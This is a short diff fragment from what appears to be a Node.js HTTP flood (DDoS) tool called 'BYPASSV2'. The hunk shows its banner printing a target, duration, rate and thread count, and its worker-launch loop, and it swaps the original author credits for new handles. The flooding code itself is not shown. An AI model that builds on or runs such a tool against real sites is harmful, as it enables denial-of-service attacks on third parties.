@@ -663,14 +663,14 @@ let randomHeaders = headerGenerator.getHeaders();
     cluster.fork();
     console.clear()
      }
-    console.log('\x1b[38;2;255;0;0m' +  'BYPASSV2| SCRIPT MADE BY @khadeptrai20 and @quanganh207'.bgRed);
+    console.log('\x1b[38;2;255;0;0m' +  'BYPASSV2| SCRIPT MADE BY @sadist69'.bgRed);
     console.log(`----------------------------------------`.gray)
     console.log('\x1b[38;2;255;0;0m' + `Target:` + process.argv[2].rainbow)
     console.log('\x1b[38;2;255;0;0m' + `Time:` + process.argv[3] .rainbow)
     console.log('\x1b[38;2;255;0;0m' +`Rate:`+ process.argv[4].rainbow)
      console.log('\x1b[38;2;255;0;0m' + `Threads:` + process.argv[5].rainbow)
     console.log(`----------------------------------------`.gray)
-     console.log(`Note :  Powerproof @rainbowc2`.gray)
+     console.log(`Note :  GITHUB " https://github.com/sadist69`.gray)
     setTimeout(() => {
     }, process.argv[5] * 1000);
     for (let counter = 1; counter <= args.threads; counter++) {
